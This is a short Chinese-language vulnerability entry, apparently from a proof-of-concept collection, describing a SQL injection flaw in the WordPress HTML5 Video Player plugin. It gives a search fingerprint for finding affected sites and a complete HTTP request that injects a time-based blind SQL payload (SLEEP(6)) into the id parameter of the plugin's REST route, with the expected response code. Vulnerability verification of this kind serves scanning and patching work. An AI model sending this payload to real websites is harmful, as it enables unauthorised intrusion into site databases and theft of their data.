﻿# WordPress HTML5 Video Player SQL 注入

> 更新时间：2024-02-06

> 漏洞编号：

> 漏洞说明：WordPress Plugin是一个可以增强和扩展WordPress网站功能的软件，它是基于WordPress平台开发的。这些插件可以添加新的功能，改变网站外观，增强安全性等。一般来说，它们可以用来优化SEO、集成社交媒体、创建联系表单、生成缩略图、添加广告等等。该产品存在SQL注入漏洞。

> 漏洞特征："wordpress" && body="html5-video-player"

> 验证脚本：HTTP

```
GET /?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+- HTTP/1.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：WordPress HTML5 Video Player SQL 注入.poc
